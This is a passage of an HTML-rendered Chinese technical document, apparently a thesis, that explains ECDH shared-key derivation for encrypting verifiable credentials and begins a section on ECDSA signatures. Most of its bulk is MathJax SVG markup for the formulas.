636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3512.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4568.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(553,-150) scale(0.707)\"><path data-c=\"1D435\" d=\"M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(5708.3,0)\"><path data-c=\"1D43A\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6494.3,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span>，其中 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.05ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.778ex\" height=\"1.645ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 786 727\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43A\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z\"/></g></g></g></svg></mjx-container></span>\n是椭圆曲线上的生成元，<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.023ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.176ex\" height=\"1.593ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 520 704\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g></g></g></svg></mjx-container></span>\n为私钥，<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.699ex\" height=\"1.545ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 751 683\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g></g></g></svg></mjx-container></span>\n为对应的公钥。共享密钥计算如下：</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"33.465ex\" height=\"1.952ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 14791.3 862.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43E\" d=\"M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(882,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"73\" d=\"M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z\"/><path data-c=\"68\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 124T102 167T103 217T103 272T103 329Q103 366 103 407T103 482T102 542T102 586T102 603Q99 622 88 628T43 637H25V660Q25 683 27 683L37 684Q47 685 66 686T103 688Q120 689 140 690T170 693T181 694H184V367Q244 442 328 442Q451 442 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(394,0)\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(950,0)\"/><path data-c=\"72\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z\" transform=\"translate(1450,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(1842,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(2286,0)\"/></g></g></g><g data-mml-node=\"mo\" transform=\"translate(3219.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4275.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(553,-152.7) scale(0.707)\"><path data-c=\"1D434\" d=\"M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(5408.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(675,-150) scale(0.707)\"><path data-c=\"1D435\" d=\"M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(6948,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(8003.7,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(553,-152.7) scale(0.707)\"><path data-c=\"1D434\" d=\"M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(9137.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(553,-150) scale(0.707)\"><path data-c=\"1D435\" d=\"M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(10276.8,0)\"><path data-c=\"1D43A\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(11340.5,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(12396.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(553,-150) scale(0.707)\"><path data-c=\"1D435\" d=\"M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(13536,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(675,-152.7) scale(0.707)\"><path data-c=\"1D434\" d=\"M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<p>该共享密钥可用于后续对称加密通信，在本系统中用于加密 VC\n内容，实现端到端隐私保护。</p>\n<h3 id=\"数字签名算法ecdsa\">2.5.3 数字签名算法：ECDSA</h3>\n<p>椭圆曲线数字签名算法（Elliptic Curve Digital Signature\nAlgorithm，ECDSA）是一种基于椭圆曲线的数字签名机制，广泛用于身份认证与数据完整性验证\n。其过程包括签名生成和签名验证两部分。</p>\n<p>设待签名消息为 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.986ex\" height=\"1.025ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 878 453\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g></svg></mjx-container></span>，用户私钥为\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.023ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.176ex\" height=\"1.593ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 520 704\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g></g></g></svg></mjx-container></span>，公钥为 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"7.671ex\" height=\"1.781ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 3390.6 787\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 